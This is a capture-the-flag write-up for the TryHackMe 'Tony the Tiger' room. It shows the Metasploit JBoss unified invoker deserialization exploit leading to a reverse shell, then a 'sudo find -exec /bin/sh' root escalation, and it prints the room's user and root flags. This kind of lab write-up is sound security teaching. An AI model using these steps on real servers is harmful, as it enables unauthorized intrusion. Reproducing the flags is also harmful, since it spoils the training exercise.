    TryHackMe: Tony the Tiger Writeup

Hey guys! Here is my writeup for the **Tony the Tiger** room on TryHackMe. This room was a bit tricky but really fun. I learned about Java Deserialization vulnerabilities and Linux privilege escalation.

##  Room Information
- **Target App:** JBoss AS 6 (Apache Tomcat/Coyote JSP engine 1.1)
- **Vulnerability:** Java Deserialization (Unified Invoker RCE)
- **User Flag:** `THM{50c10ad46b5793704601ecdad865eb06}`
- **Root Flag:** `zxcvbnm123456789`

---

##  Step-by-Step Process & What I Learned

### 1. Information Gathering (Enumeration)
I started by scanning the target IP using Nmap. I found that **Port 8080** was open and running **Apache Tomcat / JBoss AS 6**. When I went to the admin panel, I logged in using the default credentials `admin / admin`.

### 2. Exploitation (Getting Access)
Since the room focuses on Java Deserialization, I used **Metasploit** to exploit it:
1. I opened my terminal and searched for jboss exploits.
2. I chose the unified invoker module:
   ```bash
   use exploit/multi/misc/jboss_remoting_unified_invoker_rce
   ```
3. I configured the options (Target IP on Port 4446, my IP, and set `LPORT 5555`).
4. I also had to set `set ForceExploit true` to bypass the automatic check.
5. Finally, I typed `exploit` and successfully got a reverse shell!

### 3. Finding User JBoss' Flag
Once inside the system, I wanted to find the flag. I used Python to upgrade my shell to a stable TTY shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Instead of a normal `user.txt` file, the user flag was hidden inside a hidden file in JBoss' home directory. I found it by running:
```bash
cat /home/jboss/.jboss.txt
```
**User Flag:** `THM{50c10ad46b5793704601ecdad865eb06}`

### 4. Privilege Escalation (Getting Root)
To become the root user, I checked the sudo permissions for the `jboss` user. I found that `jboss` can run the `find` command as root without a password. 

I used a well-known GTFOBins trick to spawn a root shell:
```bash
sudo find . -exec /bin/sh \; -quit
```
The terminal prompt changed to `#`, meaning I was officially root! I read the final file:
```bash
cat /root/root.txt
```
After cracking the hash/password inside using the rockyou wordlist hint, I got the final 16-character string.

**Root Flag:** `zxcvbnm123456789`

---

##  Key Takeaways
- Never leave default credentials like `admin/admin` on application servers.
- Outdated JBoss servers are highly vulnerable to Java Deserialization attacks.
- Incorrect misconfigurations in `sudo` permissions (like letting users run `find` as root) can easily lead to a full system takeover.


